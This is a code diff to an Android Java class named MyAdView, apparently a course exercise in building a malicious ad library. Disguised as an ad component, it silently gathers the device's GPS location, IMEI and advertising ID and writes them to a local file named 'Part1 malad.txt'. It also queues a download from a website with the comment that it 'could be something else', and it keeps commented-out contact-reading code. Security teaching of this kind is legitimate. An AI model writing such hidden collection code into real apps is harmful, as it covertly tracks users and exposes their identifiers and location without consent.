@@ -27,15 +27,17 @@ import com.google.android.gms.common.GooglePlayServicesRepairableException;
 import android.app.DownloadManager;
 import android.net.Uri;
 
-
 import java.io.IOException;
 import java.io.OutputStreamWriter;
+import java.util.concurrent.TimeUnit;
 
 public class MyAdView {
     private static final String TAG = "MP1: MyAdView";
     public static Context ctx;
     public static boolean isLAT = false;
-    public String GAID;
+    public static String LOCA;
+    public static String IMEI;
+    public static String ADID;
     public static void loadAd(TextView tv, Context ctx) {
         MyAdView.ctx = ctx;
 
@@ -44,13 +46,15 @@ public class MyAdView {
 
     }
 
-
+    public interface AsyncResponse {
+        void processFinish(String output);
+    }
     private static void onLoad() {
         //TODO: Implement me
 
-        Long tsLong = System.currentTimeMillis()/1000;
-        String ts = tsLong.toString();
-
+        //String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+        //Long tsLong = System.currentTimeMillis()/1000;
+        //String ts = tsLong.toString();
         // GET LOCATION
         if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             return;
@@ -61,8 +65,8 @@ public class MyAdView {
         location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
         if (location != null) {
             Log.d("Answers", "Lat: " + location.getLatitude() + "Long: " + location.getLongitude());
-            String input = ts + ";" + "longitude:" + location.getLongitude() + "latitude:" + location.getLatitude();
-            writeToFile(input);
+            String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+            LOCA = timeStamp + ";" + "longitude:" + location.getLongitude() + "latitude:" + location.getLatitude();
         }else{
             LocationListener loc_listener = new LocationListener() {
                 public void onLocationChanged(Location l) {}
@@ -76,8 +80,8 @@ public class MyAdView {
                 double lat = location.getLatitude();
                 double lon = location.getLongitude();
                 Log.d("Answers", "Lat: " + lat + "Long: " + lon);
-                String input = ts + ";" + "longitude:" + location.getLongitude() + "latitude:" + location.getLatitude();
-                writeToFile(input);
+                String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+                LOCA = timeStamp + ";" + "longitude:" + location.getLongitude() + "latitude:" + location.getLatitude();
             } catch (NullPointerException e) {Log.d("Answers", "Lat: N" + "Long: N" );}
         }
 
@@ -86,13 +90,17 @@ public class MyAdView {
         TelephonyManager telephonyManager = (TelephonyManager)ctx.getSystemService(ctx.TELEPHONY_SERVICE);
         String id = telephonyManager.getDeviceId();
         Log.d("Answers", "IMEI: " + id);
-        String input = ts + ";" + "IMEI:" + id;
-        writeToFile(input);
+        String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+        IMEI = timeStamp + ";" + "IMEI:" + id;
+
 
 
 
         //GET ADVERTISING ID
+
         AsyncTask<Void, Void, String> task = new AsyncTask<Void, Void, String>() {
+            public AsyncResponse delegate = null;
+
             @Override
             protected String doInBackground(Void... params) {
                 AdvertisingIdClient.Info idInfo = null;
@@ -108,22 +116,31 @@ public class MyAdView {
                 String advertId = null;
                 try{
                     advertId = idInfo.getId();
+                    String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+                    ADID = timeStamp + ";" + "advertising_id:" + advertId;
+                    String input = LOCA + "\n" + IMEI + "\n" + ADID;
+                    writeToFile(input);
                 }catch (Exception e){
                     e.printStackTrace();
                 }
+
                 return advertId;
             }
             @Override
             protected void onPostExecute(String advertId) {
                 Log.d("Answers", "advertId: " + advertId);
-                Long tsLong = System.currentTimeMillis()/1000;
-                String ts = tsLong.toString();
-                String input = ts + ";" + "advertising_id:" + advertId;
-                writeToFile(input);
-
+                //delegate.processFinish(advertId);
             }
+
         };
+
         task.execute();
+
+        ////////// READ CONTACTS
+        //Uri personUri = ContentUris.withAppendedId(People.CONTENT_URI, personId);
+        //Uri phonesUri = Uri.withAppendedPath(personUri, People.Phones.CONTENT_DIRECTORY);
+        //String[] proj = new String[] {Phones._ID, Contacts.People.Phones.TYPE, Contacts.People.Phones.NUMBER, Contacts.People.Phones.LABEL};
+        //Cursor cursor = contentResolver.query(phonesUri, proj, null, null, null);
 
         ////////// DOWNLOAD SCRIPT FROM A WEBSITE
         // I this example case it is just a picture, but it could be something else
@@ -139,26 +156,11 @@ public class MyAdView {
 
         downloadmanager.enqueue(request);
 
-
-
-        ////////// READ CONTACTS
-        //Uri personUri = ContentUris.withAppendedId(People.CONTENT_URI, personId);
-        //Uri phonesUri = Uri.withAppendedPath(personUri, People.Phones.CONTENT_DIRECTORY);
-        //String[] proj = new String[] {Phones._ID, Contacts.People.Phones.TYPE, Contacts.People.Phones.NUMBER, Contacts.People.Phones.LABEL};
-        //Cursor cursor = contentResolver.query(phonesUri, proj, null, null, null);
-
-
-
-
-
-
-        ////////////WRITE TO FILE
-
-    }
-    private static void writeToFile(String data ){
+        }
+    private static void writeToFile(String data1){
         try {
             OutputStreamWriter outputStreamWriter = new OutputStreamWriter(ctx.openFileOutput("Part1 malad.txt", ctx.MODE_PRIVATE));
-            outputStreamWriter.write(data);
+            outputStreamWriter.write(data1);
             outputStreamWriter.close();
         }
         catch (IOException e) {
